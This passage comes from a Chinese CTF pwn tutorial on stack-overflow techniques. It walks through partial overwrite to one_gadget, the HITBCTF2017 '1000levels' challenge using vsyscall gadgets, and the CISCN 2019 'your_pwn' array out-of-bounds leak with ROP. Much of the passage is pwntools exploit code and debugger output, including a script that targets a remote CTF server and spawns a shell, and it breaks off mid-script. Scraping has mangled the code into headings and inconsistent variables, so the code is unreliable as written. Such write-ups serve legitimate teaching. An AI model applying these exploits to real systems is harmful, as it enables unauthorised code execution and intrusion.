class="number">0x7ffff700f306</span>就一定能够碰撞onegadget的地址，这是其中一个可能，还有很多种其他的可能，虽然碰撞几率不大，也不会很小，其实证明了这么久其实就是卡一个0x7ffff6fdxxxxx和0x7ffff7xxxxx这个点的几率。</span><br><span class="line">下面的操作就简单易懂了，解决怎么去覆盖的问题即可。</span><br><span class="line">相隔那么远，怎么在栈上移动？</span><br><span class="line">那么就需要找到合适的gadget了，只需要push_ret那么就可以准确定位到存放_dl_init+<span class="number">139</span>地址。使用__libc_csu_init中的gadget。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwndbg&gt; x &#x2F;10i 0x40059b 0x40059b: pop rbp 0x40059c: pop r12 0x40059e: pop r13 0x4005a0: pop r14 0x4005a2: pop r15 0x4005a4: ret</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  移动的过程如下：</span><br><span class="line"></span><br><span class="line">因为这个需要概率，因此不知道payload是不是正确���还在那一直跑，先调试代码，可以发现都是按照设想去执行  只是没成功，然后就是一直跑，直到跑出shell为止。</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br>from pwn import *</p><h3 id="context-arch-x3D-‘amd64’"><a href="#context-arch-x3D-‘amd64’" class="headerlink" title="context.arch &#x3D; ‘amd64’"></a>context.arch &#x3D; ‘amd64’</h3><h3 id="context-log-level-x3D-‘debug’"><a href="#context-log-level-x3D-‘debug’" class="headerlink" title="context.log_level &#x3D; ‘debug’"></a>context.log_level &#x3D; ‘debug’</h3><h3 id="context-terminal-x3D-‘deepin-terminal’-‘-x’-‘sh’-’-c’"><a href="#context-terminal-x3D-‘deepin-terminal’-‘-x’-‘sh’-’-c’" class="headerlink" title="context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]"></a>context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]</h3><p>offset &#x3D; 0x18<br>while True: try: p &#x3D; process(‘.&#x2F;gets’) payload&#x3D;’a’ * offset + p64(0x40059B) payload +&#x3D; ‘b’ * 8 * 5 + p64(0x40059B) + ‘c’ * 8 * 5 + p64(0x40059B) payload +&#x3D; ‘c’ * 8 * 5 + ‘\x06\xa3’</p><h3 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      p.sendline(payload)</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    data = p.recv()</span><br><span class="line">    print data</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line">except Exception:</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  这就需要耐心了，可能几十分钟都没结果（我跑了好久），然后去修改一下partial overwrite的值，将\x06\x03修改成\x06\xa3，一分钟左右就跑出来了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 题目三</span><br><span class="line">HITBCTF2017中的1000levels题目，梳理流程，函数有点多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_BOOL8 __fastcall level(signed int a1){ __int64 v2; &#x2F;&#x2F; rax __int64 buf; &#x2F;&#x2F; rsp+10h __int64 v4; &#x2F;&#x2F; rsp+18h __int64 v5; &#x2F;&#x2F; rsp+20h __int64 v6; &#x2F;&#x2F; rsp+28h unsigned int v7; &#x2F;&#x2F; rsp+30h unsigned int v8; &#x2F;&#x2F; rsp+34h unsigned int v9; &#x2F;&#x2F; rsp+38h int i; &#x2F;&#x2F; rsp+3Ch buf &#x3D; 0LL; v4 &#x3D; 0LL; v5 &#x3D; 0LL; v6 &#x3D; 0LL; if ( !a1 ) return 1LL; if ( (unsigned int)level(a1 - 1) &#x3D;&#x3D; 0 ) return 0LL; v9 &#x3D; rand() % a1; v8 &#x3D; rand() % a1; v7 &#x3D; v8 * v9; puts(“&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;”); printf(“Level %d\n”, (unsigned int)a1); printf(“Question: %d * %d &#x3D; ? Answer:”, v9, v8); for ( i &#x3D; read(0, &amp;buf, 0x400uLL); i &amp; 7; ++i ) *((_BYTE *)&amp;buf + i) &#x3D; 0; v2 &#x3D; strtol((const char <em>)&amp;buf, 0LL, 10); return v2 &#x3D;&#x3D; v7;}<br>pwn@pwn-PC:~&#x2F;Desktop$ checksec 1000levels [</em>] ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;1000levels’ Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  主要看level函数，栈溢出发生在 level函数中</span><br><span class="line">__int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">read(<span class="number">0</span>, &amp;buf, 0x400uLL)</span><br><span class="line">显然发生了溢出。其中还是开启了PIE保护。</span><br><span class="line">程序的流程是通过go函数进入关卡，获取设置的关卡数数目，在level函数中进行递归执行，程序有点复杂，就没有头绪，那么先从溢出点看，怎么利用这个溢出点？利用题目二的思路，使用partial overwrite覆盖返回地址为onegadget地址，也就是覆盖<span class="number">0x238</span>距离外的<span class="number">0x7ffff7de896b</span> (_dl_init+<span class="number">139</span>) ，然后再利用合适的gadget（因为PIE的缘故，如果还是使用__libc_csu_init的gadget的话，需要先泄漏加载地址，此处换成vsystem里面的gadget）来移动<span class="number">0x238</span>的距离进行覆盖末尾两位。但是仔细看一下程序流程发现还有一个更简单的办法， 我们上一个办法无非就是为了执行onegadget，但是在之前确定onegadget加载的地址，那么需要一个参照物，仔细看hint函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int hint(void){ signed __int64 v1; &#x2F;&#x2F; rsp+8h int v2; &#x2F;&#x2F; rsp+10h __int16 v3; &#x2F;&#x2F; rsp+14h if ( show_hint ) { sprintf((char *)&amp;v1, “Hint: %p\n”, &amp;system, &amp;system); } else { v1 &#x3D; 5629585671126536014LL; v2 &#x3D; 1430659151; v3 &#x3D; 78; } return puts((const char *)&amp;v1);}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">无论执不执行sprintf((<span class="type">char</span> *)&amp;v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system, &amp;system)这条语句，在之前执行这么一段指令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x555555554cfb &lt;hint()+11&gt; mov rax, qword ptr [rip + 0x2012ce]0x555555554d02 &lt;hint()+18&gt; mov qword ptr [rbp - 0x110], rax</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将[rip + <span class="number">0x2012ce</span>]=&gt;<span class="number">0x7ffff7a79480</span> (system)放在栈中位置是hint函��的rbp - <span class="number">0x110</span>，也就是只要执行hint函数，那么system函数就会被放在rbp - <span class="number">0x110</span>处，而且这个位置很眼熟，在go函数中也有</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int go(void){ int v1; &#x2F;&#x2F; ST0C_4 __int64 v2; &#x2F;&#x2F; rsp+0h __int64 v3; &#x2F;&#x2F; rsp+0h int v4; &#x2F;&#x2F; rsp+8h __int64 v5; &#x2F;&#x2F; rsp+10h signed __int64 v6; &#x2F;&#x2F; rsp+10h signed __int64 v7; &#x2F;&#x2F; rsp+18h __int64 v8; &#x2F;&#x2F; rsp+20h puts(“How many levels?”); v2 &#x3D; read_num(); if ( v2 &gt; 0 ) v5 &#x3D; v2; else puts(“Coward”); puts(“Any more?”); v3 &#x3D; read_num(); v6 &#x3D; v5 + v3; if ( v6 &gt; 0 ) { if ( v6 &lt;&#x3D; 999 ){ v7 &#x3D; v6; } else { puts(“More levels than before!”); v7 &#x3D; 1000LL; } puts(“Let’s go!’”); v4 &#x3D; time(0LL); if ( (unsigned int)level(v7) !&#x3D; 0 ) { v1 &#x3D; time(0LL); sprintf((char *)&amp;v8, “Great job! You finished %d levels in %d seconds\n”, v7, (unsigned int)(v1 - v4), v3); puts((const char *)&amp;v8); } else { puts(“You failed.”); } exit(0); } return puts(“Coward”);}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v5和v6都是rbp-<span class="number">0x110</span>，由于栈帧开辟的原理,main函数中的hint函数和go函数的的rbp应该是同一个地址，因此在执行完hint函数后，再去执行go函数，v5和v6中保存了system的地址，而且刚才说的栈溢出发生在level函数中，由于栈帧开辟的原理，level函数的栈帧在go函数的栈帧的低位置处，可以通过栈溢出和合适的ret的gadget去执行system函数，不过这有两个前提，一、rbp-<span class="number">0x110</span>的地址内容不会被覆盖；二、需要pop_rsi_ret的gadget和<span class="string">&#x27;/bin/sh&#x27;</span>的地址，这看起来很难满足，继续看程序逻辑，会发现</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if ( v2 &gt; 0 ) v5 &#x3D; v2;else puts(“Coward”);puts(“Any more?”);v3 &#x3D; read_num();v6 &#x3D; v5 + v3;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  也就说只要v2&lt;=<span class="number">0</span>，rbp-<span class="number">0x110</span>就不会被覆盖，而且v6 = v5 + v3可以灵活运用，可以看成onegadget_addr = system_addr + (onegadget_addr-system_addr)，因为刚才页提到了最终都要往onegadget上靠，而且我们知道，无论怎么加载，偏移量始终是固定的。这样分析完后，思路就很明确了，显示构造onegadget_addr，然后利用栈溢出和合适的ret的gadget去执行onegadget。</span><br><span class="line">第一步得找到level返回地址和rbp-<span class="number">0x110</span>的距离</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwndbg&gt; disassemble goDump of assembler code for function _Z2gov: 0x0000555555554b7c &lt;+0&gt;: push rbp 0x0000555555554b7d &lt;+1&gt;: mov rbp,rsp 0x0000555555554b80 &lt;+4&gt;: sub rsp,0x120 0x0000555555554b87 &lt;+11&gt;: lea rdi,[rip+0x506] # 0x555555555094 0x0000555555554b8e &lt;+18&gt;: call 0x555555554900 puts@plt 0x0000555555554b93 &lt;+23&gt;: call 0x555555554b00 &lt;_Z8read_numv&gt; 0x0000555555554b98 &lt;+28&gt;: mov QWORD PTR [rbp-0x120],rax 0x0000555555554b9f &lt;+35&gt;: mov rax,QWORD PTR [rbp-0x120] 0x0000555555554ba6 &lt;+42&gt;: test rax,rax 0x0000555555554ba9 &lt;+45&gt;: jg 0x555555554bb9 &lt;_Z2gov+61&gt; 0x0000555555554bab &lt;+47&gt;: lea rdi,[rip+0x4f3] # 0x5555555550a5 0x0000555555554bb2 &lt;+54&gt;: call 0x555555554900 puts@plt 0x0000555555554bb7 &lt;+59&gt;: jmp 0x555555554bc7 &lt;_Z2gov+75&gt; 0x0000555555554bb9 &lt;+61&gt;: mov rax,QWORD PTR [rbp-0x120] 0x0000555555554bc0 &lt;+68&gt;: mov QWORD PTR [rbp-0x110],rax 0x0000555555554bc7 &lt;+75&gt;: lea rdi,[rip+0x4de] # 0x5555555550ac 0x0000555555554bce &lt;+82&gt;: call 0x555555554900 puts@plt 0x0000555555554bd3 &lt;+87&gt;: call 0x555555554b00 &lt;_Z8read_numv&gt; 0x0000555555554bd8 &lt;+92&gt;: mov QWORD PTR [rbp-0x120],rax 0x0000555555554bdf &lt;+99&gt;: mov rdx,QWORD PTR [rbp-0x110] 0x0000555555554be6 &lt;+106&gt;: mov rax,QWORD PTR [rbp-0x120] 0x0000555555554bed &lt;+113&gt;: add rax,rdx 0x0000555555554bf0 &lt;+116&gt;: mov QWORD PTR [rbp-0x110],rax……</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在go的汇编代码中可以看到，总共开辟了<span class="number">0x120</span>大小的栈帧，v5和v6在rsp+10h中，很容易可以计算出level返回地址距离system_addr的距离是<span class="number">0x18</span>，栈结构如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x7fffffffcb88-0x555555554c74-go-248"><a href="#0x7fffffffcb88-0x555555554c74-go-248" class="headerlink" title="0x7fffffffcb88 | 0x555555554c74 (go()+248)"></a>0x7fffffffcb88 | 0x555555554c74 (go()+248)</h4><h4 id="0x7fffffffcb90-0x1"><a href="#0x7fffffffcb90-0x1" class="headerlink" title="0x7fffffffcb90 | 0x1"></a>0x7fffffffcb90 | 0x1</h4><h4 id="0x7fffffffcb98-0x555560531c95"><a href="#0x7fffffffcb98-0x555560531c95" class="headerlink" title="0x7fffffffcb98 | 0x555560531c95"></a>0x7fffffffcb98 | 0x555560531c95</h4><h4 id="0x7fffffffcba0-0x2"><a href="#0x7fffffffcba0-0x2" class="headerlink" title="0x7fffffffcba0 | 0x2"></a>0x7fffffffcba0 | 0x2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  经过覆盖后<span class="number">0x7fffffffcba0</span>中存的是onegadget的地址。然后在使用合适的gadget越过<span class="number">0x7fffffffcb88</span>、<span class="number">0x7fffffffcb90</span>和<span class="number">0x7fffffffcb98</span>三个内存单元，控制程序执行<span class="number">0x7fffffffcba0</span>的内容。</span><br><span class="line">第二步寻找合适的gadget。</span><br><span class="line">在PIE的情况下，怎么寻找这个合适的gadget，在stack-pivot篇幅中的第一部分ASLR和PIE的区别的时候，一直提到一个点，无论开启ASLR，还是PIE+ASLR，vsyscall的加载地址依然不变，始终为<span class="number">0xffffffffff600000</span> - <span class="number">0xffffffffff601000</span>。</span><br><span class="line">简单介绍一下vsyscall，现代的Windows和Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。执行某些操作的时候会在从用户空间切换到内核空间时需要一个介质，这介质就是系统调用，但是这一过程需要耗费一定的性能，增加了不必要的开销，vsystem就是加速某些系统调用的机制，他用来执行特定的系统调用，减少系统调用的开销，例如gettimeofday()，这样就避免了传统的系统调用模式<span class="type">int</span> <span class="number">0x80</span>/syscall造成的内核空间和用户上下文空间的切换。使用gdb将vsystem这段内存dump下来拿到IDA中进行查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>seg000:0000000000000000 mov rax, 60hseg000:0000000000000007 syscall ; Low latency system callseg000:0000000000000009 retnseg000:0000000000000009 ; —————————————————————————seg000:000000000000000A align 400hseg000:0000000000000400 mov rax, 0C9hseg000:0000000000000407 syscall ; Low latency system callseg000:0000000000000409 retnseg000:0000000000000409 ; —————————————————————————seg000:000000000000040A align 400hseg000:0000000000000800 mov rax, 135hseg000:0000000000000807 syscall ; Low latency system callseg000:0000000000000809 retn</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  显示的这三个系统调用分别是：gettimeofday, time和getcpu。值得注意的是，在我们选择gadget的是，直接调用vsyscall中的retn指令，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错</span><br><span class="line">所以不能直接调用ret，应该从头开始。</span><br><span class="line">第三步找到onegadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwn@pwn-PC:~&#x2F;Desktop$ one_gadget &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so0x3f306 execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: rax &#x3D;&#x3D; NULL<br>0x3f35a execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: [rsp+0x30] &#x3D;&#x3D; NULL<br>0xd695f execve(“&#x2F;bin&#x2F;sh”, rsp+0x60, environ)constraints: [rsp+0x60] &#x3D;&#x3D; NULL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">准备内容做完后就开始构造payload，但是本地测试一直失败 ，调试时发现每次执行vsyscall的系统调用的的时候，会报出Program recevied signal <span class="title function_">SIGSEGV</span><span class="params">(fault address <span class="number">0xa</span>)</span>的错误提示，可是没有查到原因（求大佬指点），后来在攻防世界中找到一个一样的题目<span class="string">&#x27;100levels&#x27;</span>，只不过最高的循环从<span class="number">1000</span>变为了<span class="number">100</span>，思路没有变，改了下exp就利用成功了，于是更纳闷为什么本地会报这种错误。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import *libc &#x3D; ELF(“.&#x2F;libc.so”)</p><h3 id="p-x3D-process-‘-x2F-1000levels’"><a href="#p-x3D-process-‘-x2F-1000levels’" class="headerlink" title="p &#x3D; process(‘.&#x2F;1000levels’)"></a>p &#x3D; process(‘.&#x2F;1000levels’)</h3><p>p &#x3D; remote(‘111.200.241.244’,45392)</p><h3 id="one-gadget-x3D-0x3f306"><a href="#one-gadget-x3D-0x3f306" class="headerlink" title="one_gadget &#x3D; 0x3f306"></a>one_gadget &#x3D; 0x3f306</h3><p>one_gadget &#x3D; 0x4526asystem &#x3D; libc.symbols[‘system’]<br>print r.recvuntil(“Choice:\n”)p.sendline(‘2’)print r.recvuntil(“Choice:\n”)p.sendline(‘1’)print r.recvuntil(“How many levels?\n”)p.sendline(‘0’)print r.recvuntil(“Any more?\n”)p.sendline(str(one_gadget-system))<br>def calc(): print r.recvuntil(“Question: “) num1 &#x3D; int(r.recvuntil(“ “)) print r.recvuntil(“* “) num2 &#x3D; int(r.recvuntil(“ “)) ans &#x3D; num1 * num2 print r.recvuntil(“Answer:”) p.sendline(str(ans))</p><h3 id="for-i-in-range-999"><a href="#for-i-in-range-999" class="headerlink" title="for i in range(999):"></a>for i in range(999):</h3><p>for i in range(99): calc()print p.recvuntil(“Answer:”)payload &#x3D; ‘a’ * 0x38 + p64(0xffffffffff600000) * 3p.send(payload)p.interactive()<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  # 题目四</span><br><span class="line"><span class="number">2019</span>年CISCN中your_pwn的题目，源码如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int64 fastcall main(__int64 a1, char a2, char a3){ char s; &#x2F;&#x2F; rsp+0h unsigned __int64 v5; &#x2F;&#x2F; rsp+108h v5 &#x3D; __readfsqword(0x28u); setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); memset(&amp;s, 0, 0x100uLL); printf(“input your name \nname:”, 0LL); read(0, &amp;s, 0x100uLL); while ( (unsigned int)sub_B35() ); return 0LL;}<br>_BOOL8 sub_B35(){ int v1; &#x2F;&#x2F; rsp+4h int v2; &#x2F;&#x2F; rsp+8h int i; &#x2F;&#x2F; rsp+Ch char v4[64]; &#x2F;&#x2F; rsp+10h char s; &#x2F;&#x2F; rsp+50h unsigned __int64 v6; &#x2F;&#x2F; rsp+158h v6 &#x3D; __readfsqword(0x28u); memset(&amp;s, 0, 0x100uLL); memset(v4, 0, 0x28uLL); for ( i &#x3D; 0; i &lt;&#x3D; 40; ++i ) { puts(“input index”); __isoc99_scanf(“%d”, &amp;v1); printf(“now value(hex) %x\n”, (unsigned int)v4[v1]); puts(“input new value”); __isoc99_scanf(“%d”, &amp;v2); v4[v1] &#x3D; v2; } puts(“do you want continue(yes&#x2F;no)? “); read(0, &amp;s, 0x100uLL); return strncmp(&amp;s, “yes”, 3uLL) &#x3D;&#x3D; 0;}<br>pwn@pwn-PC:~&#x2F;Desktop$ checksec pwn[*] ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;pwn’ Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  又是保护全开，根据程序的代码可以发现存在数组越界漏洞，其中v1可以控制，因为v4这个数组在读取索引的时候没有限制，引发数组越界漏洞，而且代码中分别对数组进行了读和写操作，那么造成栈空间任意地址读写（任意地址读和任意地址写）。由于PIE和canary的存在，所以思路是先泄露栈中的某个返回地址，获取栈中的某些函数(main函数的返回地址__libc_start_main+<span class="number">241</span>)的加载地址，从而计算出libc的基址，进而计算得到onegadget的地址，然后写入返回地址进行ROP即可。</span><br><span class="line">在构造payload之前，先分析一下利用过程。</span><br><span class="line">第一步泄漏main函数的返回地址__libc_start_main+<span class="number">241</span>的地址：<span class="number">0x7ffff7a5a2e1</span>，从而根据偏移拿到libc的基址 <span class="number">0x7ffff7a5a2e1</span> - <span class="number">0x201f0</span> - <span class="number">241</span> = <span class="number">0x7ffff7a3a000</span>。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二步找到onegadget</span><br><span class="line">选择一个onegadget，根据得到的libc的基址和偏移量计算出onegadget地址，<span class="number">0x7ffff7a3a000</span> + <span class="number">0x3f306</span> = <span class="number">0x7ffff7a79306</span>。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwn@pwn-PC:~&#x2F;Desktop$ one_gadget &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so0x3f306 execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: rax &#x3D;&#x3D; NULL<br>0x3f35a execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: [rsp+0x30] &#x3D;&#x3D; NULL<br>constraints: [rsp+0x60] &#x3D;&#x3D; NULL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  那么此时前期工作就做完，之后利用数组溢出泄漏基址，然后利用数组的写入操作进行rop，执行onegadget，整体的分析如下图：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结合前几节学过的知识，发现能够对过程进行简化，我们泄露<span class="number">0x7fffffffcd18</span> —▸ <span class="number">0x7ffff7a5a2e1</span> (__libc_start_main+<span class="number">241</span>) 的地址，只需要泄漏后后三位（因为前面的加载地址都一样）即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看__libc_start_main+241末尾三个字节：pwndbg&gt; x &#x2F;3bx 0x7fffffffcd180x7fffffffcd18: 0xe1 0xa2 0xa5 ：0xa5a2e1<br>使用后三位字节进行计算：0xa5a2e1- 0x201f0 - 241 &#x3D; 0xa3a000 ：libc addr0xa3a000 + 0x3f306 &#x3D; 0xa79306 ｜ onegadget addr<br>将onegadget addr进行写入：0x7fffffffcd18 ：0x06 ：v2 &#x3D; 60x7fffffffcd19 ：0x93 ：v2 &#x3D; 1470x7fffffffcd1a ：0x7a ：v2 &#x3D; 122<br>写入位置：v4[0x278] ：v1 &#x3D; 632v4[0x279] ：v1 &#x3D; 633v4[0x280] ：v1 &#x3D; 634</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意在进行printf时，是输出是格式%x，运用了一次MOVSX指令（说明：带符号扩展传送指），因此在exp中需要对输出的内容进行处理，exp如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import *</p><h3 id="context-arch-x3D-‘amd64’-1"><a href="#context-arch-x3D-‘amd64’-1" class="headerlink" title="context.arch &#x3D; ‘amd64’"></a>context.arch &#x3D; ‘amd64’</h3><h3 id="context-log-level-x3D-‘debug’-1"><a href="#context-log-level-x3D-‘debug’-1" class="headerlink" title="context.log_level &#x3D; ‘debug’"></a>context.log_level &#x3D; ‘debug’</h3><h3 id="context-terminal-x3D-‘deepin-terminal’-‘-x’-‘sh’-’-c’-1"><a href="#context-terminal-x3D-‘deepin-terminal’-‘-x’-‘sh’-’-c’-1" class="headerlink" title="context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]"></a>context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]</h3><p>libc &#x3D; ELF(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so”)p &#x3D; process(‘.&#x2F;pwn’)one_gadget &#x3D; 0x3f306libc_start_main_addr &#x3D; libc.symbols[‘__libc_start_main’]libc_start_main_241 &#x3D; 0xf1offset &#x3D; 0x278newValue &#x3D; 1<br>def byte(addr): libc_start_main &#x3D; ‘’ if(len(addr)&lt;2): libc_start_main &#x3D; ‘0’ + addr elif(len(addr)&#x3D;&#x3D;8): libc_start_main &#x3D; addr[-2:] else: libc_start_main &#x3D; addr return libc_start_main<br>p.recvuntil(“name:”)p.sendline(‘pwn’)<br>p.recvuntil(“input index\n”)p.sendline(str(offset))p.recvuntil(“now value(hex) “)addr &#x3D; p.recvuntil(‘\n’)[:-1]p.sendline(str(newValue))<br>p.recvuntil(“input index\n”)p.sendline(str(offset+1))p.recvuntil(“now value(hex) “)addr1 &#x3D; p.recvuntil(‘\n’)[:-1]p.sendline(str(newValue))<br>p.recvuntil(“input index\n”)p.sendline(str(offset+2))p.recvuntil(“now value(hex) “)addr2 &#x3D; p.recvuntil(‘\n’)[:-1]p.sendline(str(newValue))<br>libc_start_main &#x3D; byte(addr2) + byte(addr1) + byte(addr)libc_addr &#x3D; int(‘0x’+libc_start_main,16) - libc_start_main_addr - libc_start_main_241one_gadget_addr &#x3D; libc_addr + one_gadget</p><h3 id="print-hex-one-gadget-addr"><a href="#print-hex-one-gadget-addr" class="headerlink" title="print hex(one_gadget_addr)"></a>print hex(one_gadget_addr)</h3><p>a &#x3D; int(‘0x’+hex(one_gadget_addr)[-2:],16)b &#x3D; int(‘0x’+hex(one_gadget_addr)[-4:-2],16)c &#x3D; int(‘0x’+hex(one_gadget_addr)[-6:-4],16)</p><h3 id="gdb-attach-p-1"><a href="#gdb-attach-p-1" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h3><p>p.recvuntil(“input index\n”)p.sendline(str(offset))p.recvuntil(“now value(hex) “)addr &#x3D; p.recvuntil(‘\n’)[:-1]p.sendline(str(a))<br>p.recvuntil(“input index\n”)p.sendline(str(offset+1))p.recvuntil(“now value(hex) “)addr1 &#x3D; 